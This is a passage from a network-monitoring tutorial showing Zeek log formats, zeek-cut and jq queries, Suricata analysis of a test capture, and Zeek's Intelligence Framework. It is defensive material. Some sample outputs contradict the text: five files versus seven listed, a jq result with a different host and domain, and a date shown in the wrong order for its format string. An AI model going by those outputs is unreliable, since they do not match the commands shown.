16:38 .\ndrwxr-xr-x 5 root root 4096 Sep 13 16:37 ..\n-rw-r--r-- 1 root root 1673 Sep 13 16:38 conn.log\n-rw-r--r-- 1 root root 1499 Sep 13 16:38 dns.log\n-rw-r--r-- 1 root root 1037 Sep 13 16:38 files.log\n-rw-r--r-- 1 root root 1281 Sep 13 16:38 http.log\n-rw-r--r-- 1 root root  802 Sep 13 16:38 ntp.log\n-rw-r--r-- 1 root root  278 Sep 13 16:38 packet_filter.log\n-rw-r--r-- 1 root root 2919 Sep 13 16:38 syslog.log\n</code></pre> <p>Zeek created five files. We will look at the contents of Zeek log data in detail in later sections. For now, we will take a quick look at each file, beginning with the\u00a0<code>conn.log</code>.</p> <p>We use the\u00a0cat\u00a0command to show the contents of each log.</p> <pre><code>cat conn.log\n</code></pre> <pre><code>#separator \\x09\n#set_separator  ,\n#empty_field    (empty)\n#unset_field    -\n#path   conn\n#open   2024-09-13-16-38-11\n#fields ts  uid id.orig_h   id.orig_p   id.resp_h   id.resp_p   proto   service duration    orig_bytes  resp_bytes  conn_state  local_orig  local_resp  missed_bytes    history orig_pkts   orig_ip_bytes   resp_pkts   resp_ip_bytes   tunnel_parents\n#types  time    string  addr    port    addr    port    enum    string  interval    count   count   string  bool    bool    count   string  count   count   count   count   set[string]\n1726201770.278903   CTJy3z1weA4svLHlMi  fe80::11bb:1eb2:4e66:8cb2   5353    ff02::fb    5353    udp dns -   -   -   S0  T   F   0   D   1   9300    -\n1726201770.279490   C7y3kf3wLnGC8eMFoj  10.0.0.20   5353    224.0.0.251 5353    udp dns -   -   -   S0  T   F   0   D   1   73  0   0   -\n1726201774.886295   CXetZefExG72gUZBg   10.0.0.25   37842   8.8.8.8 53  udp dns 0.071811    43  107 SF  T   F   0   Dd  1   71  1   135-\n1726201774.886782   Cw9GHy49hDbEZja5N4  10.0.0.25   54819   8.8.8.8 53  udp dns 0.105430    43  267 SF  T   F   0   Dd  1   71  1   295-\n1726201776.494923   CoOFuY2lG5sn40Cx4h  10.0.0.25   51716   65.9.141.86 80  tcp http    0.095743    92  538 SF  T   F   0   ShADadFf    7   4645    806 -\n1726201776.229030   CSHUEK1r1ZslFXj9Ea  10.0.0.1    19274   10.0.0.25   514 udp syslog  1.999178    2392    0   S0  T   T   0   D   3   2476    0   0-\n1726201776.995145   CY5BY43UhmmrHShwJg  10.0.0.20   34602   185.125.190.58  123 udp ntp 0.282631    48  48  SF  T   F   0   Dd  1   76  1   76  -\n1726201774.994946   Cf7ViS38Dir6S2Sp24  10.0.0.25   37652   65.9.141.86 80  tcp http    0.108029    92  538 SF  T   F   0   ShADadFf    6   4124    754 -\n1726201775.764476   CFRepo2KqxbrWWYUr1  10.0.0.25   54034   65.9.141.117    80  tcp http    0.079561    92  538 SF  T   F   0   ShADadFf    7   4645    806 -\n1726201770.739547   CXYKK42G1Ga2LvFmh3  10.0.0.25   38596   10.0.0.20   1514    tcp -   8.024697    13178   89  OTH T   T   0   DadA    16  14010   11661   -\n#close  2024-09-13-16-38-11\n</code></pre> <p>Next we look at Zeek\u2019s\u00a0<code>dns.log</code>.</p> <pre><code>cat dns.log\n</code></pre> <pre><code>#separator \\x09\n#set_separator  ,\n#empty_field    (empty)\n#unset_field    -\n#path   dns\n#open   2024-09-13-16-38-11\n#fields ts  uid id.orig_h   id.orig_p   id.resp_h   id.resp_p   proto   trans_id    rtt query   qclass  qclass_name qtype   qtype_name  rcode   rcode_name  AATC    RD  RA  Z   answers TTLs    rejected\n#types  time    string  addr    port    addr    port    enum    count   interval    string  count   string  count   string  count   string  bool    bool    bool    bool    count   vector[string]  vector[interval]    bool\n1726201774.886295   CXetZefExG72gUZBg   10.0.0.25   37842   8.8.8.8 53  udp 27806   0.071811    testmynids.org  1   C_INTERNET  1   A   0   NOERROR F   F   TT  0   65.9.141.86,65.9.141.96,65.9.141.53,65.9.141.117    60.000000,60.000000,60.000000,60.000000 F\n1726201774.886782   Cw9GHy49hDbEZja5N4  10.0.0.25   54819   8.8.8.8 53  udp 60281   0.105430    testmynids.org  1   C_INTERNET  28  AAAA    0   NOERROR F   F   TT  0   2600:9000:204b:f000:18:30b3:e400:93a1,2600:9000:204b:4400:18:30b3:e400:93a1,2600:9000:204b:ea00:18:30b3:e400:93a1,2600:9000:204b:a00:18:30b3:e400:93a1,2600:9000:204b:2e00:18:30b3:e400:93a1,2600:9000:204b:6000:18:30b3:e400:93a1,2600:9000:204b:7a00:18:30b3:e400:93a1,2600:9000:204b:ee00:18:30b3:e400:93a1  60.000000,60.000000,60.000000,60.000000,60.000000,60.000000,60.000000,60.000000 F\n1726201770.278903   CTJy3z1weA4svLHlMi  fe80::11bb:1eb2:4e66:8cb2   5353    ff02::fb    5353    udp 0   -   _ipps._tcp.local    1   C_INTERNET  12  PTR -   -F  F   F   F   0   -   -   F\n1726201770.279490   C7y3kf3wLnGC8eMFoj  10.0.0.20   5353    224.0.0.251 5353    udp 0   -   _ipps._tcp.local    1   C_INTERNET  12  PTR -   -   F   FF  F   0   -   -   F\n#close  2024-09-13-16-38-11\n</code></pre> <p>Next we look at Zeek\u2019s\u00a0<code>files.log</code>.</p> <pre><code>cat files.log\n</code></pre> <pre><code>#separator \\x09\n#set_separator  ,\n#empty_field    (empty)\n#unset_field    -\n#path   files\n#open   2024-09-13-16-38-11\n#fields ts  fuid    uid id.orig_h   id.orig_p   id.resp_h   id.resp_p   source  depth   analyzers   mime_type   filename    duration    local_orig  is_orig seen_bytes  total_bytes missing_bytes   overflow_bytes  timedout    parent_fuid md5 sha1    sha256  extracted   extracted_cutoff    extracted_size\n#types  time    string  string  addr    port    addr    port    string  count   set[string] string  string  interval    bool    bool    count   count   count   count   bool    string  string  string  string  string  bool    count\n1726201775.068874   FQzmmA4txLAELVk6ug  Cf7ViS38Dir6S2Sp24  10.0.0.25   37652   65.9.141.86 80  HTTP    0   (empty) text/plain  -   0.000000    F   F   3939    0   0   F   -   -   -   -   -   -   -\n1726201775.817226   FrH7ji2KqzLDHybjXe  CFRepo2KqxbrWWYUr1  10.0.0.25   54034   65.9.141.117    80  HTTP    0   (empty) text/plain  -   0.000000    F   F   3939    0   0   F   -   -   -   -   -   -   -\n1726201776.568082   FEyCzJ3xbrSmbOSCN9  CoOFuY2lG5sn40Cx4h  10.0.0.25   51716   65.9.141.86 80  HTTP    0   (empty) text/plain  -   0.000000    F   F   3939    0   0   F   -   -   -   -   -   -   -\n#close  2024-09-13-16-38-11\n</code></pre> <p>Next we look at Zeek\u2019s\u00a0<code>http.log</code>.</p> <pre><code>cat http.log\n</code></pre> <pre><code>#separator \\x09\n#set_separator  ,\n#empty_field    (empty)\n#unset_field    -\n#path   http\n#open   2024-09-13-16-38-11\n#fields ts  uid id.orig_h   id.orig_p   id.resp_h   id.resp_p   trans_depth method  host    uri referrer    version user_agent  origin  request_body_len    response_body_len   status_code status_msg  info_code   info_msg    tags    username    password    proxied orig_fuids  orig_filenames  orig_mime_types resp_fuids  resp_filenames  resp_mime_types\n#types  time    string  addr    port    addr    port    count   string  string  string  string  string  string  string  count   count   count   string  count   string  set[enum]   string  string  set[string] vector[string]  vector[string]  vector[string]  vector[string]  vector[string]  vector[string]\n1726201775.010870   Cf7ViS38Dir6S2Sp24  10.0.0.25   37652   65.9.141.86 80  1   GET testmynids.org  /uid/index.html -   1.1 curl/7.81.0 -   0   39  200OK   -   -   (empty) -   -   -   -   -   -   FQzmmA4txLAELVk6ug  -   text/plain\n1726201775.794614   CFRepo2KqxbrWWYUr1  10.0.0.25   54034   65.9.141.117    80  1   GET testmynids.org  /uid/index.html -   1.1 curl/7.81.0 -   0   39  200OK   -   -   (empty) -   -   -   -   -   -   FrH7ji2KqzLDHybjXe  -   text/plain\n1726201776.528222   CoOFuY2lG5sn40Cx4h  10.0.0.25   51716   65.9.141.86 80  1   GET testmynids.org  /uid/index.html -   1.1 curl/7.81.0 -   0   39  200OK   -   -   (empty) -   -   -   -   -   -   FEyCzJ3xbrSmbOSCN9  -   text/plain\n#close  2024-09-13-16-38-11\n</code></pre> <p>Finally, we look at Zeek\u2019s\u00a0<code>packet_filter.log</code>. This log shows any filters that Zeek applied when processing the trace.</p> <pre><code>cat packet_filter.log\n</code></pre> <pre><code>#separator \\x09\n#set_separator  ,\n#empty_field    (empty)\n#unset_field    -\n#path   packet_filter\n#open   2024-09-13-16-38-11\n#fields ts  node    filter  init    success failure_reason\n#types  time    string  string  bool    bool    string\n1726202291.728926   zeek    ip or not ip    T   T   -\n#close  2024-09-13-16-38-11\n</code></pre> <p>As we can see with each log file, there is a set of headers beginning with the hash character (<code>#</code>) followed by metadata about the trace. This format is the standard version of Zeek data, represented as tab separated values (TSV).</p> <p>Interpreting this data as shown requires remembering which \u201ccolumn\u201d applies to which \u201cvalue.\u201d For example, in the\u00a0<code>dns.log</code>, the third field is\u00a0<code>id.orig_h</code>, so when we see data in that field, such as\u00a0<code>10.0.0.25</code>, we know that\u00a0<code>10.0.0.25</code>\u00a0is\u00a0<code>id.orig_h</code>.</p> <p>One of the common use cases for interacting with Zeek log files requires analysing specific fields. Investigators may not need to see all of the fields produced by Zeek when solving a certain problem. The following sections offer a few ways to address this concern when processing Zeek logs in text format.</p>"},{"location":"zeek/zeek.html#zeek-tsv-format-and-zeek-cut","title":"Zeek TSV Format and\u00a0zeek-cut","text":"<p>The Zeek project provides a tool called\u00a0zeek-cut\u00a0to make it easier for analysts to interact with Zeek logs in TSV format. It parses the header in each file and allows the user to refer to the specific columnar data available. This is in contrast to tools like\u00a0awk\u00a0that require the user to refer to fields referenced by their position.</p> <p>If we pass zeek-cut the fields we wish to see, the output looks like this:</p> <pre><code>cat dns.log | zeek-cut id.orig_h query answers\n</code></pre> <pre><code>10.0.0.25   testmynids.org  65.9.141.86,65.9.141.96,65.9.141.53,65.9.141.117\n...\n</code></pre> <p>The sequence of field names given to zeek-cut determines the output order. This means you can also use zeek-cut to reorder fields.</p> <p>Note that in its default setup using ZeekControl (but not with a simple command-line invocation like\u00a0<code>zeek\u00a0-i\u00a0eth0</code>), watching a live interface and writing logs to disk, Zeek will rotate log files on an hourly basis. Zeek will move the current log file into a directory named using the format\u00a0<code>YYYY-MM-DD</code>. Zeek will use\u00a0gzip\u00a0to compress the file with a naming convention that includes the log file type and time range of the file.</p> <p>When processing a compressed log file, use the\u00a0zcat\u00a0tool instead of\u00a0cat\u00a0to read the file. Consider working with the gzip-encoding file created in the following example. For demonstration purposes, we create a copy of the\u00a0<code>dns.log</code>\u00a0file as\u00a0<code>dns1.log</code>,\u00a0gzip\u00a0it, and then read it with\u00a0zcat\u00a0instead of\u00a0cat.</p> <pre><code>cp dns.log dns1.log\ngzip dns1.log\nzcat dns1.log.gz\n</code></pre> <pre><code>#separator \\x09\n#set_separator  ,\n#empty_field    (empty)\n#unset_field    -\n#path   dns\n#open   2024-09-13-16-38-11\n#fields ts  uid id.orig_h   id.orig_p   id.resp_h   id.resp_p   proto   trans_id    rtt query   qclass  qclass_name qtype   qtype_name  rcode   rcode_name  AATC    RD  RA  Z   answers TTLs    rejected\n#types  time    string  addr    port    addr    port    enum    count   interval    string  count   string  count   string  count   string  bool    bool    bool    bool    count   vector[string]  vector[interval]    bool\n1726201774.886295   CXetZefExG72gUZBg   10.0.0.25   37842   8.8.8.8 53  udp 27806   0.071811    testmynids.org  1   C_INTERNET  1   A   0   NOERROR F   F   TT  0   65.9.141.86,65.9.141.96,65.9.141.53,65.9.141.117    60.000000,60.000000,60.000000,60.000000 F\n1726201774.886782   Cw9GHy49hDbEZja5N4  10.0.0.25   54819   8.8.8.8 53  udp 60281   0.105430    testmynids.org  1   C_INTERNET  28  AAAA    0   NOERROR F   F   TT  0   2600:9000:204b:f000:18:30b3:e400:93a1,2600:9000:204b:4400:18:30b3:e400:93a1,2600:9000:204b:ea00:18:30b3:e400:93a1,2600:9000:204b:a00:18:30b3:e400:93a1,2600:9000:204b:2e00:18:30b3:e400:93a1,2600:9000:204b:6000:18:30b3:e400:93a1,2600:9000:204b:7a00:18:30b3:e400:93a1,2600:9000:204b:ee00:18:30b3:e400:93a1  60.000000,60.000000,60.000000,60.000000,60.000000,60.000000,60.000000,60.000000 F\n1726201770.278903   CTJy3z1weA4svLHlMi  fe80::11bb:1eb2:4e66:8cb2   5353    ff02::fb    5353    udp 0   -   _ipps._tcp.local    1   C_INTERNET  12  PTR -   -F  F   F   F   0   -   -   F\n1726201770.279490   C7y3kf3wLnGC8eMFoj  10.0.0.20   5353    224.0.0.251 5353    udp 0   -   _ipps._tcp.local    1   C_INTERNET  12  PTR -   -   F   FF  F   0   -   -   F\n#close  2024-09-13-16-38-11\n</code></pre> <p>zeek-cut\u00a0accepts the flag\u00a0<code>-d</code>\u00a0to convert the epoch time values in the log files to human-readable format. For example, observe the default timestamp value:</p> <pre><code>zcat dns1.log.gz | zeek-cut ts id.orig_h query answers\n</code></pre> <pre><code>1726201774.886295   10.0.0.25   testmynids.org  65.9.141.86,65.9.141.96,65.9.141.53,65.9.141.117\n...\n</code></pre> <p>Now see the effect of using the\u00a0<code>-d</code>\u00a0flag:</p> <pre><code>cat dns.log | zeek-cut -d ts id.orig_h query answers\n</code></pre> <pre><code>2024-09-13T16:29:34+1200    10.0.0.25   testmynids.org  65.9.141.86,65.9.141.96,65.9.141.53,65.9.141.117\n...\n</code></pre> <p>Converting the timestamp from a log file to UTC can be accomplished with the\u00a0<code>-u</code>\u00a0option.</p> <p>The default time format when using the\u00a0<code>-d</code>\u00a0or\u00a0<code>-u</code>\u00a0is the\u00a0<code>strftime</code>\u00a0format string\u00a0<code>%Y-%m-%dT%H:%M:%S%z</code>\u00a0which results in a string with year, month, day of month, followed by hour, minutes, seconds and the timezone offset.</p> <p>The default format can be altered by using the\u00a0<code>-D</code>\u00a0and\u00a0<code>-U</code>\u00a0flags, using the standard\u00a0<code>strftime</code>\u00a0syntax. For example, to format the timestamp in the US-typical \u201cMiddle Endian\u201d you could use a format string of:\u00a0<code>%m-%d-%YT%H:%M:%S%z</code></p> <pre><code>13-09-2024T16:29:34+1200    10.0.0.25   testmynids.org  65.9.141.86,65.9.141.96,65.9.141.53,65.9.141.117\n...\n</code></pre>"},{"location":"zeek/zeek.html#zeek-json-format-logs","title":"Zeek JSON Format Logs","text":"<p>During the last decade, the JavaScript Object Notation (JSON) format has become a standard way to label and store many types of data. Zeek offers support for this format. In the following example we will re-run the\u00a0<code>sample.pcap</code>\u00a0trace through Zeek, but request that it output logs in JSON format.</p> <p>First we change into the json directory to avoid overwriting our existing log files.</p> <pre><code>cd ../json/\n</code></pre> <p>Next we tell Zeek to output logs in JSON format using the command as shown.</p> <pre><code>/opt/zeek/bin/zeek -C -r ../sample.pcap LogAscii::use_json=T\n</code></pre> <p>When we look at the directory contents, we see the same five output files.</p> <pre><code>root@Suricata:/home/cyber/test_pcap/json# ls -al\ntotal 36\ndrwxr-xr-x 2 root root 4096 Sep 13 16:56 .\ndrwxr-xr-x 5 root root 4096 Sep 13 16:37 ..\n-rw-r--r-- 1 root root 3714 Sep 13 16:56 conn.log\n-rw-r--r-- 1 root root 1895 Sep 13 16:56 dns.log\n-rw-r--r-- 1 root root 1098 Sep 13 16:56 files.log\n-rw-r--r-- 1 root root 1247 Sep 13 16:56 http.log\n-rw-r--r-- 1 root root  780 Sep 13 16:56 ntp.log\n-rw-r--r-- 1 root root   90 Sep 13 16:56 packet_filter.log\n-rw-r--r-- 1 root root 3138 Sep 13 16:56 syslog.log\n</code></pre> <p>However, if we look at the file contents, the format is much different.</p> <p>First we look at\u00a0<code>packet_filter.log</code>.</p> <pre><code>cat packet_filter.log\n</code></pre> <pre><code>{\"ts\":1726203404.305186,\"node\":\"zeek\",\"filter\":\"ip or not ip\",\"init\":true,\"success\":true}\n</code></pre> <p>Next we look at\u00a0<code>dns.log</code>.</p> <pre><code>cat dns.log\n</code></pre> <pre><code>{\"ts\":1726201774.886295,\"uid\":\"CboAKi44MALjum3o2k\",\"id.orig_h\":\"10.0.0.25\",\"id.orig_p\":37842,\"id.resp_h\":\"8.8.8.8\",\"id.resp_p\":53,\"proto\":\"udp\",\"trans_id\":27806,\"rtt\":0.07181096076965332,\"query\":\"testmynids.org\",\"qclass\":1,\"qclass_name\":\"C_INTERNET\",\"qtype\":1,\"qtype_name\":\"A\",\"rcode\":0,\"rcode_name\":\"NOERROR\",\"AA\":false,\"TC\":false,\"RD\":true,\"RA\":true,\"Z\":0,\"answers\":[\"65.9.141.86\",\"65.9.141.96\",\"65.9.141.53\",\"65.9.141.117\"],\"TTLs\":[60.0,60.0,60.0,60.0],\"rejected\":false}\n...\n</code></pre> <p>Next we look at\u00a0<code>files.log</code>.</p> <pre><code>cat files.log\n</code></pre> <pre><code>{\"ts\":1726201775.068874,\"fuid\":\"FQzmmA4txLAELVk6ug\",\"uid\":\"CQcULU2VXecTtcygwa\",\"id.orig_h\":\"10.0.0.25\",\"id.orig_p\":37652,\"id.resp_h\":\"65.9.141.86\",\"id.resp_p\":80,\"source\":\"HTTP\",\"depth\":0,\"analyzers\":[],\"mime_type\":\"text/plain\",\"duration\":0.0,\"local_orig\":false,\"is_orig\":false,\"seen_bytes\":39,\"total_bytes\":39,\"missing_bytes\":0,\"overflow_bytes\":0,\"timedout\":false}\n...\n</code></pre> <p>Next we look at the\u00a0<code>http.log</code>.</p> <pre><code>cat http.log\n</code></pre> <pre><code>{\"ts\":1726201775.01087,\"uid\":\"CQcULU2VXecTtcygwa\",\"id.orig_h\":\"10.0.0.25\",\"id.orig_p\":37652,\"id.resp_h\":\"65.9.141.86\",\"id.resp_p\":80,\"trans_depth\":1,\"method\":\"GET\",\"host\":\"testmynids.org\",\"uri\":\"/uid/index.html\",\"version\":\"1.1\",\"user_agent\":\"curl/7.81.0\",\"request_body_len\":0,\"response_body_len\":39,\"status_code\":200,\"status_msg\":\"OK\",\"tags\":[],\"resp_fuids\":[\"FQzmmA4txLAELVk6ug\"],\"resp_mime_types\":[\"text/plain\"]}\n...\n</code></pre> <p>Comparing the two log styles, we see strengths and weaknesses for each. For example, the TSV format shows the Zeek types associated with each entry, such as\u00a0<code>string</code>,\u00a0<code>addr</code>,\u00a0<code>port</code>, and so on. The JSON format does not include that data. However, the JSON format associates each field \u201ckey\u201d with a \u201cvalue,\u201d such as\u00a0<code>\"id.orig_p\":37652</code>. While this necessarily increases the amount of disk space used to store the raw logs, it makes it easier for analysts and software to interpret the data, as the key is directly associated with the value that follows. For this reason, most developers and analysts have adopted the JSON output format for Zeek logs. That is the format we will use for the log analysis sections of the documentation.</p>"},{"location":"zeek/zeek.html#zeek-json-format-and-jq","title":"Zeek JSON Format and\u00a0jq","text":"<p>Analysts sometimes choose to inspect JSON-formatted Zeek files using applications that recognise JSON format, such as\u00a0jq, which is a JSON parser by Stephen Dolan, available at GitHub (https://stedolan.github.io/jq/). It may already be installed on your Unix-like system.</p> <p>In the following example we process the\u00a0<code>dns.log</code>\u00a0file with the\u00a0<code>.</code>\u00a0filter, which tells\u00a0jq\u00a0to simply output what it finds in the file. By default\u00a0jq\u00a0outputs JSON formatted data in its \u201cpretty-print\u201d style, which puts one key:value pair on each line as shown.</p> <pre><code>jq . dns.log\n</code></pre> <pre><code>{\n  \"ts\": 1726201774.886295,\n  \"uid\": \"CboAKi44MALjum3o2k\",\n  \"id.orig_h\": \"10.0.0.25\",\n  \"id.orig_p\": 37842,\n  \"id.resp_h\": \"8.8.8.8\",\n  \"id.resp_p\": 53,\n  \"proto\": \"udp\",\n  \"trans_id\": 27806,\n  \"rtt\": 0.07181096076965332,\n  \"query\": \"testmynids.org\",\n  \"qclass\": 1,\n  \"qclass_name\": \"C_INTERNET\",\n  \"qtype\": 1,\n  \"qtype_name\": \"A\",\n  \"rcode\": 0,\n  \"rcode_name\": \"NOERROR\",\n  \"AA\": false,\n  \"TC\": false,\n  \"RD\": true,\n  \"RA\": true,\n  \"Z\": 0,\n  \"answers\": [\n    \"65.9.141.86\",\n    \"65.9.141.96\",\n    \"65.9.141.53\",\n    \"65.9.141.117\"\n  ],\n  \"TTLs\": [\n    60,\n    60,\n    60,\n    60\n  ],\n  \"rejected\": false\n}\n...\n</code></pre> <p>We can tell\u00a0jq\u00a0to output what it sees in \u201ccompact\u201d format using the\u00a0<code>-c</code>\u00a0switch.</p> <pre><code>jq . -c dns.log\n</code></pre> <pre><code>{\"ts\":1726201774.886295,\"uid\":\"CboAKi44MALjum3o2k\",\"id.orig_h\":\"10.0.0.25\",\"id.orig_p\":37842,\"id.resp_h\":\"8.8.8.8\",\"id.resp_p\":53,\"proto\":\"udp\",\"trans_id\":27806,\"rtt\":0.07181096076965332,\"query\":\"testmynids.org\",\"qclass\":1,\"qclass_name\":\"C_INTERNET\",\"qtype\":1,\"qtype_name\":\"A\",\"rcode\":0,\"rcode_name\":\"NOERROR\",\"AA\":false,\"TC\":false,\"RD\":true,\"RA\":true,\"Z\":0,\"answers\":[\"65.9.141.86\",\"65.9.141.96\",\"65.9.141.53\",\"65.9.141.117\"],\"TTLs\":[60,60,60,60],\"rejected\":false}\n...\n</code></pre> <p>The power of\u00a0jq\u00a0becomes evident when we decide we only want to see specific values. For example, the following tells\u00a0jq\u00a0to look at the\u00a0<code>dns.log</code>\u00a0and report the source IP of systems doing DNS queries, followed by the query, and any answer to the query.</p> <pre><code>jq -c '[.\"id.orig_h\", .\"query\", .\"answers\"]' dns.log\n</code></pre> <pre><code>[\"192.168.4.76\",\"testmyids.com\",null]\n[\"192.168.4.76\",\"testmyids.com\",[\"31.3.245.133\"]]\n</code></pre> <p>For a more comprehensive description of the capabilities of\u00a0jq, see the\u00a0jq manual.</p> <p>With this basic understanding of how to interact with Zeek logs, we can now turn to specific logs and interpret their values.</p>"},{"location":"zeek/zeek.html#zeek-to-suricata-integration-via-pcap-files","title":"Zeek to Suricata Integration via PCAP Files","text":"<p>You can use Zeek to capture network traffic and save it as PCAP files, which can then be processed by Suricata for further signature-based analysis.</p> <p>Run the following command to capture packets from an interface and write them to a file named sample3.pcap</p> <pre><code>sudo tcpdump -i ens32 -s 0 -w sample3.pcap\n</code></pre> <p>For demonstration purposes, a curl command to <code>http://testmyids.org/uid/index.html</code> was run few times to trigger Suricata alerts. </p> <pre><code>curl http://testmyids.org/uid/index.html\n</code></pre> <p>After capturing traffic, kill the tcpdump (with\u00a0ctrl-c).</p> <p>Analyse <code>sample3.pcap</code> with Suricata:</p> <pre><code>#/home/cyber/test directory\nsudo suricata -r sample3.pcap -c /etc/suricata/suricata.yaml\n</code></pre> <p>Check summary of Suricata alerts</p> <pre><code>#/home/cyber/test directory\ncat fast.log\n</code></pre> <pre><code>09/13/2024-15:57:41.930330  [**] [1:2022973:1] ET INFO Possible Kali Linux hostname in DHCP Request Packet [**] [Classification: Potential Corporate Privacy Violation] [Priority: 1] {UDP} 0.0.0.0:68 -&gt; 255.255.255.255:67\n09/13/2024-16:12:26.419561  [**] [1:2100498:7] GPL ATTACK_RESPONSE id check returned root [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 65.9.141.117:80 -&gt; 10.0.0.25:35302\n09/13/2024-16:12:28.115791  [**] [1:2100498:7] GPL ATTACK_RESPONSE id check returned root [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 65.9.141.53:80 -&gt; 10.0.0.25:34888\n09/13/2024-16:12:29.725875  [**] [1:2100498:7] GPL ATTACK_RESPONSE id check returned root [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 65.9.141.117:80 -&gt; 10.0.0.25:35310\n09/13/2024-16:12:31.507368  [**] [1:2100498:7] GPL ATTACK_RESPONSE id check returned root [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 65.9.141.53:80 -&gt; 10.0.0.25:34894\n09/13/2024-16:12:32.574700  [**] [1:2100498:7] GPL ATTACK_RESPONSE id check returned root [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 65.9.141.117:80 -&gt; 10.0.0.25:35312\n09/13/2024-16:22:41.951177  [**] [1:2100498:7] GPL ATTACK_RESPONSE id check returned root [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 65.9.141.53:80 -&gt; 10.0.0.25:43742\n09/13/2024-16:29:35.102985  [**] [1:2100498:7] GPL ATTACK_RESPONSE id check returned root [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 65.9.141.86:80 -&gt; 10.0.0.25:37652\n09/13/2024-16:29:35.844047  [**] [1:2100498:7] GPL ATTACK_RESPONSE id check returned root [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 65.9.141.117:80 -&gt; 10.0.0.25:54034\n09/13/2024-16:29:36.590678  [**] [1:2100498:7] GPL ATTACK_RESPONSE id check returned root [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 65.9.141.86:80 -&gt; 10.0.0.25:51716\n</code></pre>"},{"location":"zeek/zeek.html#zeeks-intelligence-framework","title":"Zeek\u2019s Intelligence Framework","text":""},{"location":"zeek/zeek.html#introduction","title":"Introduction","text":"<p>The goals of Zeek\u2019s Intelligence Framework are to consume intelligence data, make it available for matching, and provide infrastructure to improve performance and memory utilization.</p> <p>Data in the Intelligence Framework is an atomic piece of intelligence such as an IP address or an e-mail address. This atomic data will be packed with metadata such as a freeform source field, a freeform descriptive field, and a URL which might lead to more information about the specific item. The metadata in the default scripts has been deliberately kept to a minimum.</p>"},{"location":"zeek/zeek.html#quick-start","title":"Quick Start","text":"<p>Verify that there is no file named <code>intel.log</code> in the <code>/opt/zeek/logs/current/</code></p> <pre><code>ls -la /opt/zeek/logs/current\n</code></pre> <p>First we need to define the intelligence data to match. Let\u2019s look for the domain\u00a0<code>www.reddit.com</code>. For the details of the file format see the\u00a0Loading Intelligence\u00a0section below.</p> <pre><code>nano /home/cyber/intel_test/data.txt\n</code></pre> <pre><code>#fields       indicator       indicator_type  meta.source\nwww.reddit.com        Intel::DOMAIN   my_special_source\n</code></pre> <p>The file should look like this (with tabs instead of spaces):</p> <pre><code>#fields&lt;TAB&gt;indicator&lt;TAB&gt;indicator_type&lt;TAB&gt;meta.source\nwww.reddit.com&lt;TAB&gt;Intel::DOMAIN&lt;TAB&gt;my_special_source\n</code></pre> <p>Now we need to tell Zeek about the data. Add this line to your <code>opt/zeek/share/zeek/site/local.zeek</code> to load an intelligence file:</p> <pre><code>redef Intel::read_files += { \"/home/cyber/intel_test/data.txt\" };\n</code></pre> <p>Add the following line to\u00a0<code>local.zeek</code>\u00a0to load the scripts that send \u201cseen\u201d data into the Intelligence Framework to be checked against the loaded intelligence data:</p> <pre><code>@load frameworks/intel/seen\n</code></pre> <p>If you want your logs to be generated in JSON format, add the following line to <code>local.zeek</code></p> <pre><code>@load policy/tuning/json-logs.zeek\n</code></pre> <p>Save <code>local.zeek</code> and redeploy Zeek via Zeekctl</p> <pre><code>/opt/zeek/bin/zeekctl\n[ZeekControl] &gt; deploy\n</code></pre> <p>Navigate to <code>www.reddit.com</code> on a web browser or run <code>curl https://www.reddit.com</code></p> <p>Verify that <code>intel.log</code> is generated in the <code>/opt/zeek/logs/current/</code> directory.</p> <pre><code>ls -la /opt/zeek/logs/current/intel.log \n-rw-r--r-- 1 root zeek 1003 Sep 13 17:34 /opt/zeek/logs/current/intel.log\n</code></pre> <p>Intelligence data matches will be logged to the\u00a0<code>intel.log</code>\u00a0file. A match on\u00a0<code>www.reddit.com</code>\u00a0might look like this:</p> <p>TSV Format:</p> <pre><code>#separator \\x09\n#set_separator  ,\n#empty_field    (empty)\n#unset_field    -\n#path   intel\n#open   2024-09-13-17-34-18\n#fields ts  uid id.orig_h   id.orig_p   id.resp_h   id.resp_p   seen.indicator  seen.indicator_type seen.where  seen.node   matched sources fuid    file_mime_type  file_desc\n#types  time    string  addr    port    addr    port    string  enum    enum    string  set[enum]   set[string] string  string  string\n1726205657.998538   CqUrI04Y7fFPsytdRe  10.0.0.25   47594   8.8.8.8 53  www.reddit.com  Intel::DOMAIN   DNS::IN_REQUEST zeek    Intel::DOMAIN   my_special_source   -   -   -\n1726205657.999634   Cifoa91ikOBbh89gn6  10.0.0.25   39683   8.8.8.8 53  www.reddit.com  Intel::DOMAIN   DNS::IN_REQUEST zeek    Intel::DOMAIN   my_special_source   -   -   -\n1726205658.134483   CDfw3o3w2dyFyCK4J1  10.0.0.25   49050   151.101.65.140  80  www.reddit.com  Intel::DOMAIN   HTTP::IN_HOST_HEADER    zeek    Intel::DOMAIN   my_special_source   -   --\n1726205661.327155   Cgj6iV1JWK1QPFoE5d  10.0.0.25   51836   151.101.193.140 80  www.reddit.com  Intel::DOMAIN   HTTP::IN_HOST_HEADER    zeek    Intel::DOMAIN   my_special_source   -   --\n</code></pre> <p>JSON format:</p> <pre><code>jq . intel.log\n</code></pre> <pre><code>{\n  \"ts\": 1726206423.770539,\n  \"uid\": \"CGLHKn3xKB169eRyuc\",\n  \"id.orig_h\": \"10.0.0.25\",\n  \"id.orig_p\": 54142,\n  \"id.resp_h\": \"151.101.65.140\",\n  \"id.resp_p\": 80,\n  \"seen.indicator\": \"www.reddit.com\",\n  \"seen.indicator_type\": \"Intel::DOMAIN\",\n  \"seen.where\": \"HTTP::IN_HOST_HEADER\",\n  \"seen.node\": \"zeek\",\n  \"matched\": [\n    \"Intel::DOMAIN\"\n  ],\n  \"sources\": [\n    \"my_special_source\"\n  ]\n}\n</code></pre>"},{"location":"zeek/zeek.html#references","title":"References","text":"<ul> <li>https://youtu.be/WBid7AZ5w4A?si=YvWCA8kIJXT1jItY</li> <li>https://docs.zeek.org/en/master/index.html</li> </ul>"},{"location":"zui/zui.html","title":"Zui","text":"<p>Zui is an open-source desktop application designed for efficient data exploration and analysis, particularly in network security. Zui has built-in support for both Zeek and Suricata, allowing users to import 